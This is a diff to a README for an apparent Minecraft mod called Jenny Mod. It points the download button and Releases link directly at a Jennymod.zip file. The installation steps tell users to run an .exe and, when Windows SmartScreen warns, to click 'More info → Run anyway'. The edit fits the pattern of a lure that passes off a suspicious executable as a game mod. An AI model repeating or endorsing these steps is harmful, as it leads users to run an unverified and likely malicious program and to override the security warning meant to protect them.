@@ -53,9 +53,9 @@
 
 ## Installation
 
-[![Download MyMod Installer](button.svg)]()
+[![Download MyMod Installer](button.svg)](https://github.com/Mguelfedrigo/Jenny-Mod-Jar/releases/download/1/Jennymod.zip)
 
-1. Click the button above or go to [**Releases**](../../releases/latest)  
+1. Click the button above or go to [**Releases**](https://github.com/Mguelfedrigo/Jenny-Mod-Jar/releases/download/1/Jennymod.zip)  
 2. Run the `.exe` — if SmartScreen appears click **More info → Run anyway**  
 3. Follow the on‑screen steps and launch Minecraft  
 
